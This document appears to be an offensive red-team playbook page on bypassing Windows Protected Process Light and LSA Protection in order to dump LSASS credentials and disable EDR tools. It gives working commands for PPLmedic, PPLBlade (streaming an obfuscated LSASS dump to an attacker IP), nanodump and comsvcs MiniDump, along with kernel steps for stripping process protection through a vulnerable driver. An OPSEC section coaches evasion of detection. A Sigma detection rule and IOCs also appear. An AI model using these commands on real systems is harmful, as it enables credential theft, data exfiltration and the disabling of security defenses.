# PPL / LSA Protection Bypass

Cluster on **Protected Process Light (PPL)** and **LSA Protection (RunAsPPL)** — the mechanism
that stops unsigned/lower-trust code from opening protected processes (LSASS, AntiMalware/EDR
services, csrss). Two goals: (1) **dump a PPL-protected LSASS** for credentials, (2) **strip PPL
off an EDR** so it can be killed/tampered. Userland exploit chains (no driver) are the quietest;
BYOVD is the heavy hammer.

## Theory / Mechanism

A process's `EPROCESS.Protection` (`PS_PROTECTION`) byte encodes a **Type** (PP vs PPL) and a
**Signer** level. A handle request succeeds only if the requester's protection dominates the
target's. Signer hierarchy (low→high): `Authenticode < CodeGen < Antimalware < Lsa < Windows <
WinTcb < WinSystem`. LSASS with **LSA Protection** runs PPL/`Lsa`; EDRs run PPL/`Antimalware` via
an **ELAM** driver that certifies the signer.
```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL      # 1/2 = LSA Protection on
# Live protection level (Process Hacker / Process Explorer 'Protection' column), or:
```
`scripts/Get-ProcessMitigationMap.ps1` flags which processes are protected and at what level.

## Bypass Techniques

### 1. PPLmedic — userland-only PPL dump (itm4n)
A pure-userland exploit chain (no vulnerable driver) that abuses logic in PPL-loadable code paths
to read the memory of an arbitrary PPL, including LSASS, on supported builds. Quietest option —
no Sysmon-6 driver-load IOC, no service registry key.
```bash
# Dump a PPL (e.g., LSASS) with a userland exploit chain — requires local admin
PPLmedic.exe dump <lsass_pid> C:\Windows\Temp\out.dmp
# or list/operate on protected processes; check the project for current verbs/build support
```

### 2. PPLBlade — protected-process dumper with obfuscated/remote output
Dumps a protected process and avoids the obvious on-disk minidump IOC by obfuscating the dump and
optionally transferring it off-host instead of writing a `.dmp`.
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp ^
  --obfuscate --network raw --ip 10.0.0.5 --port 4444
# obfuscated, streamed to attacker host -> no MDMP magic bytes on disk
```

### 3. nanodump — minimal-footprint LSASS dump (Fortra/Cobalt Strike)
Creates a minidump using direct/indirect syscalls and writes an invalid-signature dump (restore
offline) to dodge signature/heuristic scanning of the dump file. Pair with an ASR-excluded path
(see asr-amsi-etw-blinding.md) if the LSASS ASR rule is on.
```bash
nanodump.x64.exe --write C:\Windows\Temp\report.docx --valid   # or omit --valid then restore
# BOF variant runs in-beacon: nanodump (no child process, no comsvcs LOLBin)
```

### 4. BYOVD PPL kill / strip (kernel)
With a kernel R/W primitive from a vulnerable signed driver (see byovd-vbs-hvci.md), zero the
target's `EPROCESS.Protection` byte (now it's an unprotected process you can open and dump/kill),
or remove the EDR's process from kernel callback notification.
```text
1. Load unblocked vulnerable driver -> arbitrary kernel R/W
2. Walk ActiveProcessLinks, find target EPROCESS by ImageFileName
3. Write 0x00 to EPROCESS.Protection (PS_PROTECTION) -> PPL stripped
4. Open + MiniDumpWriteDump (LSASS) or TerminateProcess (EDR)
```
Tools that wrap this: PPLKiller (RedCursor), EDRSandblast (wavestone-cdt) and its GodFault variant
(gabriellandau) which also nukes kernel callbacks / ETW-TI.

### 5. Legacy LOLBin dump (now heavily monitored — historical)
```cmd
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Temp\d.bin full
```
Flagged by virtually every EDR and the LSASS ASR rule; included for completeness, not stealth.

## Credential Guard reality
If **Credential Guard** (VBS, VTL1) is on, LSASS secrets live in the isolated `LsaIso` enclave —
even a perfect LSASS dump yields no plaintext/NTLM for protected creds. Pivot to: Kerberos ticket
theft (tickets are still in VTL0 / `lsass` working set), DCSync (replication rights), DPAPI abuse,
keylogging at credential entry, or overpass-the-hash with stolen tickets. (See byovd-vbs-hvci.md
for what VBS does and does not protect.)

## Detection

```yaml
title: PPL/LSASS Credential Access - Protected Dump or Protection Strip
id: c3e7b1a9-2f4d-4a8c-9b6e-5d4c3b2a1f09
status: stable
logsource:
  product: windows
  category: process_access          # Sysmon EID 10
detection:
  lsass_access:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains: ['0x1010','0x1410','0x1438','0x143a','0x1fffff']
  driver_load:                       # Sysmon EID 6 (BYOVD path)
    Signed: 'true'
    SignatureStatus: 'Valid'
    ImageLoaded|endswith: '.sys'
  condition: lsass_access or driver_load
fields: [SourceImage, TargetImage, GrantedAccess, ImageLoaded, Signature]
falsepositives: [legit security agents, backup/AV reading lsass]
level: high
```
IOCs: handle to LSASS with `0x1010`/`0x1410` (VM_READ|QUERY) from a non-AV process; `.dmp`/MDMP
magic (`MDMP`/`PMDM`) on disk; Sysmon EID 6 driver load of a non-Microsoft signed `.sys` plus a
matching `HKLM\SYSTEM\CurrentControlSet\Services\<drv>` create (EID 13); EDR self-protection alert
on `EPROCESS.Protection` modification; ETW-TI `OpenProcess`/`ReadProcessMemory` of LSASS. MDE
Advanced Hunting can cross-ref loaded `.sys` hashes against LOLDrivers + the Microsoft Vulnerable
Driver List.

## OPSEC

- Prefer userland (**PPLmedic / PPLBlade / nanodump**) over BYOVD — no driver-load IOC, no service
  key, no HVCI tripwire. Reserve BYOVD for when you must kill a PPL EDR or LSA Protection blocks the
  userland chain on that build.
- Don't write a real `.dmp`: use nanodump invalid-signature / PPLBlade obfuscation + network
  exfil, and restore the dump offline. Avoid `comsvcs MiniDump` (top-of-funnel signature).
- If the LSASS ASR rule is on, run the dumper from an existing Defender-excluded path or via a
  trusted-image hollow (see asr-amsi-etw-blinding.md) — do not add a new exclusion.
- Stripping `EPROCESS.Protection` on a PPL EDR triggers self-protection telemetry the instant it
  happens; sequence it immediately before the action it enables and expect to lose stealth.

## References

- itm4n — *PPLmedic* (userland PPL dump chain): https://github.com/itm4n/PPLmedic
- itm4n — *PPLdump* (userland PPL dump via privileged-process abuse): https://github.com/itm4n/PPLdump
- tastypepperoni — *PPLBlade* (obfuscated/remote protected-process dumper): https://github.com/tastypepperoni/PPLBlade
- Fortra — *nanodump* (minimal-footprint LSASS dumper / BOF): https://github.com/fortra/nanodump
- RedCursor — *PPLKiller* (LSA Protection bypass via driver): https://github.com/RedCursorSecurityConsulting/PPLKiller
- wavestone-cdt — *EDRSandblast* (BYOVD: kill callbacks, ETW-TI, PP/PPL): https://github.com/wavestone-cdt/EDRSandblast
- gabriellandau — *EDRSandblast-GodFault*: https://github.com/gabriellandau/EDRSandblast-GodFault
